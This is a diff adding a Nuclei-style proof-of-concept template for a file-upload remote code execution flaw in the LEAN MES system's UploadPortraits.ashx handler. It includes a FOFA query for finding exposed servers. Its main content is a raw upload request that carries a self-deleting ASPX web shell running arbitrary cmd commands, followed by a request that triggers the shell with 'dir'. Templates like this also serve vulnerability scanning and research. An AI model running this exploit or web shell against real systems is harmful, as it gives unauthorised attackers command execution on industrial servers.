@@ -1,0 +1,88 @@
+id: poc-coh0c42tssbb6gsh
+info:
+  name: 深科特LEAN MES系统 UploadPortraits.ashx 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/coh0c42tssbb6gsh'
+  tags: rce,file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: coh0c42tssbb6gsh
+    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
+http:
+- raw:
+  - 'POST /Handler/UploadPortraits.ashx?UserId=1&Filename=1.aspx&Type=Upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
+
+
+    ------WebKitFormBoundary7ctER307B0RaQwOp
+
+    Content-Disposition: form-data; name="Filedata";filename="1.aspx"
+
+    Content-Type: application/octet-stream
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    <%
+
+    var c=new System.Diagnostics.ProcessStartInfo("cmd");
+
+    var e=new System.Diagnostics.Process();
+
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+    c.UseShellExecute=false;
+
+    c.RedirectStandardOutput=true;
+
+    c.RedirectStandardError=true;
+
+    e.StartInfo=c;
+
+    c.Arguments="/c " + Request.Item["cmd"];
+
+    e.Start();
+
+    out=e.StandardOutput;
+
+    EI=e.StandardError;
+
+    e.Close();
+
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    Response.End();%>
+
+    ------WebKitFormBoundary7ctER307B0RaQwOp--
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774777238003-b5aaad31-e213-40c6-a0ce-021b341147eb.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /Content/images/portraits/1.aspx?cmd=dir HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
